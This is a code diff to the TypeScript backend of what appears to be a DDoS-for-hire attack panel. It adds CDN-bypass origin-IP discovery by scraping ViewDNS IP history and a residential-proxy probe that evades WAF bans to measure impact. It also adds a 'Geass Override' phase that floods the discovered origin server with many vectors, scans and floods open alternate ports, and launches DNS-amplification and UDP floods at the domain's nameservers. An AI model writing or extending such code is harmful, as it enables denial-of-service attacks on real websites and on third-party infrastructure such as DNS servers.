@@ -21,13 +21,15 @@ import { fileURLToPath } from "node:url";
 import dnsP from "node:dns/promises";
 import https from "node:https";
 import http  from "node:http";
+import net   from "node:net";
+import { execFile } from "node:child_process";
 import {
   CreateAttackBody,
   GetAttackParams,
   DeleteAttackParams,
   StopAttackParams,
 } from "@workspace/api-zod";
-import { proxyCache, healthyProxyCache, fastProxyCache, slowProxyCache } from "./proxies.js";
+import { proxyCache, healthyProxyCache, fastProxyCache, slowProxyCache, getResidentialCreds } from "./proxies.js";
 import { CLUSTER_NODES } from "./cluster.js";
 
 // ── Cluster node health cache — refreshed every 60 s ─────────────────────────
@@ -148,6 +150,56 @@ const TIMESERIES_MAX = 120;
 interface LiveCodes { ok: number; redir: number; client: number; server: number; timeout: number }
 const liveResponseCodes = new Map<number, LiveCodes>();  // per attack-id
 const liveLatAvgMs      = new Map<number, number>();     // running avg latency per attack
+
+// ── Live probe results — auto-probe target via residential proxy every 15s ──
+// Gives real latency + HTTP status from a clean residential IP during the attack.
+// Unlike direct curl (which gets blocked), residential proxy bypasses WAF IP bans.
+interface ProbeResult {
+  t: number;           // unix timestamp
+  up: boolean;         // site is responding
+  statusCode: number | null;
+  latencyMs: number;
+  serverHeader: string | null;
+  via: string;         // "residential" | "direct"
+}
+const liveProbeResult  = new Map<number, ProbeResult>();    // latest probe per attack
+const liveProbeHistory = new Map<number, ProbeResult[]>();  // last 20 probes per attack
+const liveOriginIP     = new Map<number, string>();         // found origin IP per attack
+
+// Internal probe function — curl via residential proxy to measure real impact
+// Uses %{time_total} (from curl) to get actual latency, not TCP RTT estimate
+async function _attackProbe(targetUrl: string): Promise<ProbeResult> {
+  const t0 = Date.now();
+  const rc  = getResidentialCreds();
+  const proxyArg: string[] = rc
+    ? ["-x", `http://${rc.username}:${rc.password}@${rc.host}:${rc.port}`]
+    : [];
+  const args = [
+    "-s", "--max-time", "12",
+    "-o", "/dev/null",
+    "-w", "%{http_code}\\n%{time_total}\\n%header{server}",
+    "--ssl-no-revoke", "--insecure",
+    ...proxyArg,
+    targetUrl,
+  ];
+  return new Promise(resolve => {
+    execFile("curl", args, { timeout: 14_000 }, (err, stdout) => {
+      const latencyMs = Date.now() - t0;
+      const via       = rc ? "residential" : "direct";
+      if (err || !stdout.trim()) {
+        resolve({ t: Date.now(), up: false, statusCode: null, latencyMs, serverHeader: null, via });
+        return;
+      }
+      const lines      = stdout.trim().split("\n");
+      const statusCode = parseInt(lines[0] ?? "0", 10) || null;
+      const curlMs     = parseFloat(lines[1] ?? "0") * 1000;
+      const serverHdr  = lines[2]?.trim() || null;
+      const latency    = curlMs > 0 ? Math.round(curlMs) : latencyMs;
+      const up         = !!statusCode && statusCode > 0 && statusCode < 500 && statusCode !== 503;
+      resolve({ t: Date.now(), up, statusCode, latencyMs: latency, serverHeader: serverHdr, via });
+    });
+  });
+}
 
 // ── DB write batcher — accumulate deltas, flush every 500ms ────────────────
 // Prevents ~140 concurrent DB writes/s during Geass Override (21+ vectors × 300ms flush)
@@ -574,7 +626,7 @@ async function _findOriginIPForAttack(hostname: string, cdnIPs: string[]): Promi
   const mu   = new Set<string>(); // dedup in-flight
 
   // Collect ALL candidate IPs from ALL sources in parallel, then verify all at once
-  const [subResults, ipv6Results, txtResults, mxResults, crtResults, htResults] = await Promise.allSettled([
+  const [subResults, ipv6Results, txtResults, mxResults, crtResults, htResults, viewDnsResults] = await Promise.allSettled([
     // 1. Subdomains — all resolved simultaneously
     Promise.allSettled(BYPASS_SUBS.map(sub =>
       dnsP.resolve4(`${sub}.${hostname}`).catch(() => [] as string[])
@@ -625,6 +677,27 @@ async function _findOriginIPForAttack(hostname: string, cdnIPs: string[]): Promi
           }
         }
         return ips;
+      } catch { clearTimeout(timer); return [] as string[]; }
+    })(),
+    // 7. ViewDNS IP History — historical A records before CDN was added
+    //    Most valuable source: shows the REAL server IP before they hid behind CDN
+    (async () => {
+      const ac = new AbortController();
+      const timer = setTimeout(() => ac.abort(), 10_000);
+      try {
+        const r = await fetch(
+          `https://viewdns.info/iphistory/?domain=${hostname}`,
+          { headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml" }, signal: ac.signal }
+        );
+        clearTimeout(timer);
+        const html = await r.text();
+        // Extract IPs from table cells — ViewDNS embeds IP history in <td> tags in a plain table
+        const ips: string[] = [];
+        for (const m of html.matchAll(/<td>(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})<\/td>/g)) {
+          ips.push(m[1]);
+        }
+        if (ips.length > 0) console.log(`[origin-discovery] ViewDNS found ${ips.length} historical IPs for ${hostname}`);
+        return [...new Set(ips)];
       } catch { clearTimeout(timer); return [] as string[]; }
     })(),
   ] as const);
@@ -696,6 +769,14 @@ async function _findOriginIPForAttack(hostname: string, cdnIPs: string[]): Promi
     console.log(`[origin-discovery] HackerTarget found ${htIps.length} IPs for ${hostname}`);
     for (const ip of htIps) {
       if (!_isCFIP(ip) && !seen.has(ip) && !mu.has(ip)) { mu.add(ip); candidates.push(ip); }
+    }
+  }
+
+  // Collect from ViewDNS history — high priority: often gives the real pre-CDN IP directly
+  if (viewDnsResults.status === "fulfilled" && (viewDnsResults.value as string[]).length > 0) {
+    const vdIps = viewDnsResults.value as string[];
+    for (const ip of vdIps) {
+      if (!_isCFIP(ip) && !seen.has(ip) && !mu.has(ip)) { mu.add(ip); candidates.unshift(ip); } // unshift = higher priority
     }
   }
 
@@ -1164,22 +1245,79 @@ async function runAttackWorkers(
         const cdnIPs_g = await dnsP.resolve4(geassHostname).catch(() => [] as string[]);
         const originIP_g = await _findOriginIPForAttack(geassHostname, cdnIPs_g).catch(() => null);
         if (originIP_g && !signal.aborted) {
-          console.log(`[geass-override] ✓ ORIGIN PIVOT ATIVADO: ${originIP_g} — redirecionando 100% dos threads para origin direto`);
-          // 100% thread budget → direct origin attack (CDN bypass completely)
+          console.log(`[geass-override] ✓ ORIGIN PIVOT ATIVADO: ${originIP_g} — multi-porta + NS flood iniciando`);
+
+          // Store for panel display
+          if (id != null) liveOriginIP.set(id, originIP_g);
+
           const oT = threads;
           const oW = Math.max(6, CPU_COUNT);
-          void Promise.all([
-            // H2 RST + Pipeline first — highest origin server CPU burn
-            spawnPool("h2-rst-burst",   originIP_g, 443, Math.ceil(oT * 0.35), oW,                         signal, onStats, undefined, geassHostname),
-            spawnPool("http-pipeline",  originIP_g, 80,  Math.ceil(oT * 0.35), oW,                         signal, onStats, undefined, geassHostname),
-            spawnPool("waf-bypass",     originIP_g, 443, Math.ceil(oT * 0.30), Math.max(4, Math.floor(CPU_COUNT/2)+2), signal, onStats, undefined, geassHostname),
-            spawnPool("conn-flood",     originIP_g, 443, Math.ceil(oT * 0.20), 1,                                    signal, onStats, undefined, geassHostname),
-            spawnPool("slowloris",      originIP_g, 80,  Math.ceil(oT * 0.20), 1,                                    signal, onStats, undefined, geassHostname),
-            spawnPool("ssl-death",      originIP_g, 443, Math.ceil(oT * 0.15), 2,                                    signal, onStats, undefined, geassHostname),
-            spawnPool("http2-flood",    originIP_g, 443, Math.ceil(oT * 0.25), Math.max(4, CPU_COUNT),               signal, onStats, undefined, geassHostname),
-            spawnPool("http-bypass",    originIP_g, 443, Math.ceil(oT * 0.20), Math.max(3, Math.floor(CPU_COUNT/2)), signal, onStats, undefined, geassHostname),
-            spawnPool("tls-renego",     originIP_g, 443, Math.ceil(oT * 0.15), Math.max(3, Math.floor(CPU_COUNT/2)), signal, onStats, undefined, geassHostname),
+
+          // ── Phase 1: core origin vectors on ports 80 + 443 ─────────────────
+          const phase1 = Promise.all([
+            spawnPool("h2-rst-burst",  originIP_g, 443, Math.ceil(oT * 0.35), oW,                              signal, onStats, undefined, geassHostname),
+            spawnPool("http-pipeline", originIP_g, 80,  Math.ceil(oT * 0.35), oW,                              signal, onStats, undefined, geassHostname),
+            spawnPool("waf-bypass",    originIP_g, 443, Math.ceil(oT * 0.30), Math.max(4, Math.floor(CPU_COUNT/2)+2), signal, onStats, undefined, geassHostname),
+            spawnPool("conn-flood",    originIP_g, 443, Math.ceil(oT * 0.20), 1,                                signal, onStats, undefined, geassHostname),
+            spawnPool("slowloris",     originIP_g, 80,  Math.ceil(oT * 0.20), 1,                                signal, onStats, undefined, geassHostname),
+            spawnPool("ssl-death",     originIP_g, 443, Math.ceil(oT * 0.15), 2,                                signal, onStats, undefined, geassHostname),
+            spawnPool("http2-flood",   originIP_g, 443, Math.ceil(oT * 0.25), Math.max(4, CPU_COUNT),           signal, onStats, undefined, geassHostname),
+            spawnPool("http-bypass",   originIP_g, 443, Math.ceil(oT * 0.20), Math.max(3, Math.floor(CPU_COUNT/2)), signal, onStats, undefined, geassHostname),
+            spawnPool("tls-renego",    originIP_g, 443, Math.ceil(oT * 0.15), Math.max(3, Math.floor(CPU_COUNT/2)), signal, onStats, undefined, geassHostname),
           ]).catch(() => {});
+
+          // ── Phase 2: multi-port expansion — many origins expose alt ports ──
+          // Probe which alt ports are open (quick TCP connect), then flood those too
+          const ALT_PORTS = [8080, 8443, 3000, 8000, 5000];
+          const altPortTasks = ALT_PORTS.map(altPort =>
+            new Promise<void>(resolvePort => {
+              const sock = new net.Socket();
+              sock.setTimeout(2500);
+              sock.connect(altPort, originIP_g, () => {
+                sock.destroy();
+                if (!signal.aborted) {
+                  const useHttps = altPort === 8443;
+                  console.log(`[geass-override] Alt port ${altPort} open on ${originIP_g} — flooding`);
+                  void spawnPool(
+                    useHttps ? "h2-rst-burst" : "http-pipeline",
+                    originIP_g, altPort, Math.ceil(oT * 0.25), Math.max(3, Math.floor(CPU_COUNT/2)),
+                    signal, onStats, undefined, geassHostname
+                  ).catch(() => {});
+                  void spawnPool(
+                    "conn-flood", originIP_g, altPort, Math.ceil(oT * 0.15), 1,
+                    signal, onStats, undefined, geassHostname
+                  ).catch(() => {});
+                }
+                resolvePort();
+              });
+              sock.on("error", () => { sock.destroy(); resolvePort(); });
+              sock.on("timeout", () => { sock.destroy(); resolvePort(); });
+            })
+          );
+
+          // ── Phase 3: NS flood — flood the domain's nameservers ─────────────
+          // If NS goes down or gets saturated, CDN cannot renew DNS lookups
+          const nsFloodTask = (async () => {
+            try {
+              const nsRecords = await dnsP.resolveNs(geassHostname).catch(() => [] as string[]);
+              const nsAll = nsRecords.length > 0 ? nsRecords
+                : await dnsP.resolveNs(geassHostname.split(".").slice(-2).join(".")).catch(() => [] as string[]);
+              if (nsAll.length === 0) return;
+              console.log(`[geass-override] NS flood: targeting ${nsAll.join(", ")}`);
+              const nsIps = (await Promise.allSettled(nsAll.map(ns => dnsP.resolve4(ns).catch(() => [] as string[]))))
+                .flatMap(r => r.status === "fulfilled" ? r.value : [])
+                .filter(ip => !_isCFIP(ip));
+              if (nsIps.length === 0) return;
+              for (const nsIp of nsIps.slice(0, 4)) {
+                if (signal.aborted) break;
+                console.log(`[geass-override] NS flood → ${nsIp}:53`);
+                void spawnPool("dns-amp", nsIp, 53, Math.ceil(oT * 0.20), 1, signal, onStats).catch(() => {});
+                void spawnPool("udp-flood", nsIp, 53, Math.ceil(oT * 0.15), 1, signal, onStats).catch(() => {});
+              }
+            } catch { /* NS flood is best-effort */ }
+          })();
+
+          void Promise.all([phase1, ...altPortTasks, nsFloodTask]).catch(() => {});
         } else if (!signal.aborted) {
           console.log(`[geass-override] ✗ Origin IP não encontrado — mantendo ataque CDN completo`);
         }
@@ -1607,6 +1745,29 @@ router.post("/attacks", attackLimiter, async (req, res): Promise<void> => {
   _codeDispatchers.set(ctrl.signal, (codes, latAvgMs) => onWorkerCodes(id, codes, latAvgMs));
   ctrl.signal.addEventListener("abort", () => _codeDispatchers.delete(ctrl.signal), { once: true });
 
+  // ── Live site probe loop — auto-probe every 15s via residential proxy ──────
+  // Gives real impact measurement from a clean IP (bypasses WAF IP bans on our infra)
+  {
+    const _probeTargetUrl = /^https?:\/\//i.test(target) ? target : `https://${target}`;
+    const _probeHist: ProbeResult[] = [];
+    liveProbeHistory.set(id, _probeHist);
+    // First probe immediately to establish baseline before attack hits
+    void _attackProbe(_probeTargetUrl).then(pr => {
+      _probeHist.push(pr);
+      liveProbeResult.set(id, pr);
+    }).catch(() => {});
+    const _probeTimer = setInterval(async () => {
+      if (!attackAborts.has(id)) { clearInterval(_probeTimer); return; }
+      try {
+        const pr = await _attackProbe(_probeTargetUrl);
+        _probeHist.push(pr);
+        if (_probeHist.length > 20) _probeHist.shift(); // keep last 20 readings
+        liveProbeResult.set(id, pr);
+      } catch { /* probe is best-effort */ }
+    }, 15_000);
+    ctrl.signal.addEventListener("abort", () => clearInterval(_probeTimer), { once: true });
+  }
+
   // ── Geass Override cluster fan-out (primary node only, not peer) ────────────
   if (method === "geass-override" && !req.query.peer) {
     fanOutToCluster(target, port, method, duration, threads);
@@ -1638,6 +1799,12 @@ router.post("/attacks", attackLimiter, async (req, res): Promise<void> => {
     setTimeout(() => { liveResponseCodes.delete(id); liveLatAvgMs.delete(id); }, 60_000);
     // Keep timeseries for 60s after attack ends so panel can render final chart
     setTimeout(() => liveTimeseries.delete(id), 60_000);
+    // Keep probe history + origin IP for 60s after attack so panel can show final impact
+    setTimeout(() => {
+      liveProbeResult.delete(id);
+      liveProbeHistory.delete(id);
+      liveOriginIP.delete(id);
+    }, 60_000);
     const t = attackTimers.get(id);
     if (t) clearTimeout(t);
     attackTimers.delete(id);
@@ -1750,6 +1917,10 @@ router.get("/attacks/:id/live", (req, res): void => {
     // T003 — response code breakdown + average latency
     codes,
     latAvgMs:     liveLatAvgMs.get(id) ?? 0,
+    // Real-impact probe — site status via residential proxy (not blocked by WAF)
+    probe:        liveProbeResult.get(id)  ?? null,
+    probeHistory: liveProbeHistory.get(id) ?? [],
+    originIP:     liveOriginIP.get(id)     ?? null,
   });
 });
 
